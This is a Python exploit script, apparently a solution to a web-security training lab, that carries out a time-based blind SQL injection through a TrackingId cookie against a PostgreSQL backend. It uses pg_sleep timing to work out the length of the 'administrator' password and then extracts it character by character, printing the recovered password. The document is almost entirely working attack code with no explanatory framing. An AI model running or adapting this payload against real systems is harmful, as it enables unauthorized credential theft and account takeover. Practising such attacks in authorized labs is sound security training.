from urllib import parse
import urllib3
import time
import sys
import requests

'''
you can assume that password length is already known - 20 character
this way you saved some time by reducing length bruteforcing requests 
'''
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def pass_len(url, proxies):
    for i in range(0, 32):
        payload = f"' || (SELECT CASE WHEN((SELECT LENGTH(password) FROM users WHERE username='administrator') >{i}) THEN pg_sleep(10) ELSE pg_sleep(0) END)--"
        encoded_payload = parse.quote(payload)
        cookies = {'TrackingId':''+encoded_payload, 'session':''} # replace with cookies
        before = time.time()
        r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        after = time.time()

        if after-before >5:
            return i 
        else:
            continue


def bruter(url, proxies):
    extracted =''
    length = pass_len(url, proxies)
    
    for i in range(1, length+1):
        for j in range(32, 126):
            payload = f"' || (SELECT CASE WHEN(ascii(SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1)) ={j}) THEN pg_sleep(10) ELSE pg_sleep(0) END)--"
            encoded_payload = parse.quote(payload)
            cookies = {'TrackingId':''+encoded_payload, 'session':''} # replace with cookies
            before = time.time()
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            after = time.time()

            seconds = after-before

            if seconds > 5:
                extracted += chr(j)
                sys.stdout.write('\r' + extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' +extracted+ chr(j))
                sys.stdout.flush()
    print(f"\n administrator password is {extracted}")

def main():
    proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: python3 {sys.argv[0]} www.example.com")

    url = sys.argv[1]
    print("[+] Retrieving administrator password...")

    try:
        bruter(url, proxies)
    except KeyboardInterrupt:
        print('\n [!] interrupted by user')
        sys.exit()


if __name__ == "__main__":
    main()